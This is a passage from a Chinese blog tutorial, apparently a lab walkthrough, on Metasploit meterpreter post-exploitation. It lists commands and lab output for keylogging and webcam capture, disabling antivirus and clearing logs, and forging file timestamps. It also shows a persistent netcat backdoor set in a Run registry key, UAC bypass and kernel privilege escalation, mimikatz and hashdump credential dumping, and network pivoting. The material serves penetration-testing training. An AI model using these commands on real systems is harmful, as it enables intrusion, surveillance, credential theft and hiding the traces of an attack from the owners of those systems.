如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-1"><a href="#4-1-基本系统命令-1" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>

<h3 id="4-2-文件系统命令-1"><a href="#4-2-文件系统命令-1" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>

<h3 id="4-3-网络命令-1"><a href="#4-3-网络命令-1" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="4-4-信息收集-1"><a href="#4-4-信息收集-1" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>

<h3 id="4-5-提权-1"><a href="#4-5-提权-1" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>

2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>

使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>

3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure>

<h3 id="4-6-获取凭证-1"><a href="#4-6-获取凭证-1" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure>

